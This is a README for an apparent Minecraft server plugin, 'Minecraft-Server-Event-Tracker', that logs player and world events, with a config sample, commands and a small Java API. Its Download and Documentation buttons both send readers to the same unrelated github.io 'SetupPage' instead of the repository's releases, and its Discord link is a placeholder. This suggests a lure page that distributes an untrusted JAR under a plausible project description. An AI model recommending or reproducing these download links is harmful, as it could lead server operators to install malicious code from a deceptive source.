# Minecraft-Server-Event-Tracker  

**Author:** *TigerProxy78*  

A lightweight, highly configurable Spigot/Bukkit plugin that watches every heartbeat of your Minecraft world. From player joins/leaves to block placements, entity spawns, and plugin‑level hooks—track, log, and alert on the events that matter to you.

---  

## 🚀 Quick Start  

|  |  |
|---|---|
| **Download** | <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github" alt="Download"></a> |
| **Documentation** | <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Docs-Read%20Now-green?style=for-the-badge&logo=readthedocs" alt="Docs"></a> |
| **Support** | <a href="https://discord.com/invite/yourserver"><img src="https://img.shields.io/badge/Discord-Join%20Us-7289da?style=for-the-badge&logo=discord" alt="Discord"></a> |

> **Tip:** Drop the compiled JAR into your server’s `plugins/` folder, restart, and run `/eventtracker reload` to apply the default config.

---  

## 📋 What It Does  

| Category | Tracked Events | Typical Use‑Case |
|----------|----------------|-----------------|
| **Player actions** | Join, Quit, Chat, Command, Death, Advancement, Item use | Moderation logs, custom welcome messages |
| **World changes** | Block place/break, fluid flow, mob spawn/despawn, weather shift, time change | Anti‑grief alerts, map‑change analytics |
| **Plugin hooks** | Any plugin that fires a Bukkit `Event` (e.g., Essentials, WorldGuard) | Cross‑plugin monitoring without extra code |
| **Custom alerts** | Discord webhook, in‑game broadcast, console log, file write | Real‑time notifications for admins |

---  

## 🛠️ Configuration  

All options live in `config.yml`. The file is regenerated on first run with comments explaining each key.

```yaml
# Example snippet
alerts:
  enabled: true
  webhook-url: "https://discord.com/api/webhooks/..."
  broadcast-prefix: "[EventTracker]"
logging:
  file: "eventtracker.log"
  level: "INFO" # INFO, DEBUG, WARN
filters:
  player:
    ignore-ops: true
    ignored-commands:
      - "/msg"
      - "/tp"
world:
  track-block-changes: true
  track-weather: false
```

- **Enable/disable** entire categories with a single boolean.  
- **Whitelist/blacklist** specific events or players.  
- **Dynamic reload:** `/eventtracker reload` applies changes without a server restart.  

---  

## 🔧 Installation  

1. **Download** the latest release (button above).  
2. Place `Minecraft-Server-Event-Tracker.jar` into `<your_server>/plugins/`.  
3. Restart the server **or** run `/reload` (recommended: full restart).  
4. Edit `plugins/EventTracker/config.yml` to suit your needs.  
5. Use the in‑game commands:

| Command | Description |
|---------|-------------|
| `/eventtracker reload` | Reload config on the fly |
| `/eventtracker status` | Show which categories are active |
| `/eventtracker test <event>` | Trigger a dummy event for debugging |

---  

## 📦 Compatibility  

| Platform | Versions |
|----------|----------|
| Spigot | 1.16 – 1.21 |
| Paper | 1.16 – 1.21 |
| Bukkit | 1.16 – 1.21 |
| Folia (experimental) | 1.19+ |

---  

## 🧩 Extending the Plugin  

The API is deliberately minimal:

```java
public interface EventTrackerListener {
    void onCustomEvent(Event event);
}
```

Register your listener in `onEnable()`:

```java
getServer().getPluginManager().registerEvents(new MyListener(), this);
```

All native Bukkit events are already piped through the tracker, so you can tap into them without extra boilerplate.

---  

## 📈 Performance  

- **Asynchronous logging** – file writes happen off the main tick thread.  
- **Selective tracking** – disable unused categories to keep CPU overhead < 0.5 % on a typical 20‑player server.  
- **Batch webhook dispatch** – groups alerts in 1‑second windows to avoid rate limits.

---  

## 🙋‍♂️ Contributing  

1. Fork the repo.  
2. Create a feature branch (`git checkout -b feat/your‑feature`).  
3. Follow the existing code style (Google Java Format).  
4. Submit a Pull Request with a clear description and test evidence.  

All contributions are welcomed—whether it’s a new event filter, a language translation, or documentation improvements.

---  

## 📜 License  

This project is released under the **MIT License**. See `LICENSE` for details.

---  

### 🎉 Join the Community  

- **Discord:** https://discord.com/invite/yourserver  
- **GitHub Issues:** Report bugs or request features directly on this repo.  

Happy tracking!